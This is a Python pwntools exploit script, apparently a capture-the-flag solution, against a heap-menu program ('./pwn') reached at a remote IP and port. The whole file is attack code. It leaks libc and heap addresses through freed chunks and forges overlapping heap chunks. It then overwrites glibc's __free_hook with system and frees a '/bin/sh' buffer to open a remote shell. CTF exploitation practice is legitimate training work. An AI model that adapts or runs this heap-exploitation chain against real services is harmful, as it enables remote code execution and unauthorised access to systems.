#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('47.111.59.243', 10001)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/glibc/glibc-2.23/debug_x86/lib/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0x12BA)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Purchase(length, name):
    sh.sendlineafter('>>> ', '1')
    sh.sendlineafter('Name length: ', str(length))
    sh.sendafter('Name: ', name)
    sh.sendlineafter('Price: ', str(1))

def Comment(index, comment):
    sh.sendlineafter('>>> ', '2')
    sh.sendlineafter('Index: ', str(index))
    sh.sendafter(' : ', comment)
    sh.sendlineafter('And its score: ', str(1))

def Throw(index):
    sh.sendlineafter('>>> ', '3')
    sh.sendlineafter('WHICH IS THE RUBBISH PC? Give me your index: ', str(index))

Purchase(0x8c, 'a\n')
Purchase(0x8c, 'b\n')
Comment(0, 'a')
Comment(1, 'b')

Throw(0)
Throw(1)
Purchase(1, 'a')
Comment(0, '\x40')
Throw(0)
sh.recvuntil('Comment ')
sh.recvn(8)
result = sh.recvn(4)
main_arena_addr = u32(result) - 48
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x18)
log.success('libc_addr: ' + hex(libc_addr))

Purchase(0xf4, 'c\n')
Purchase(0x74, 'd\n')
# 0x2d
Purchase(0xfc, 'e\n')
Throw(0)
Purchase(0xfc, 'f\n')
Throw(2)
Purchase(0xfc, '\0' * 0xf8 + p32(0x1c8))
Purchase(0x104, '/bin/sh\0\n')
Purchase(0x104, '/bin/sh\0\n')
Purchase(0x104, '/bin/sh\0\n')
# pause()
Throw(4)
Throw(0)

Purchase(0x9c, 'g\n')
Purchase(0x4c, 'i' * 8 + p32(0) + p32(0x19) + p32(0) + p32(main_arena_addr + 8) + '\n') # 
# Comment(2, 'b')
sh.sendlineafter('>>> ', '2')
sh.sendlineafter('Index: ', str(2))
sh.recvuntil('Comment on ')
result = sh.recvn(4)
heap_addr = u32(result) - 0x30
log.success('heap_addr: ' + hex(heap_addr))
sh.sendafter(' : ', 'b')
sh.sendlineafter('And its score: ', str(1))

Throw(4)
Purchase(0x4c, 'i' * 8 + p32(0) + p32(0x19) + p32(0) + p32(heap_addr + 8) + '\n') # 
# pause()
Throw(2)

sh.sendlineafter('>>> ', '1')
sh.sendlineafter('Name length: ', str(0x2c))
sh.sendafter('Name: ', p32(libc_addr + libc.symbols['__free_hook'] - 12) + p32(libc_addr + libc.symbols['__free_hook'] + 0x10) + p32(libc_addr + libc.symbols['__free_hook']) + '\n')
sh.sendlineafter('Price: ', str(0x21))


sh.sendlineafter('>>> ', '2')
sh.sendlineafter('Index: ', str(1))
sh.sendafter(' : ', '\n')
sh.sendlineafter('And its score: ', str(0x21))

Throw(2)
Purchase(0x1c, p32(libc_addr + libc.symbols['system']) + '\n')

Throw(5)

sh.interactive()
clear()
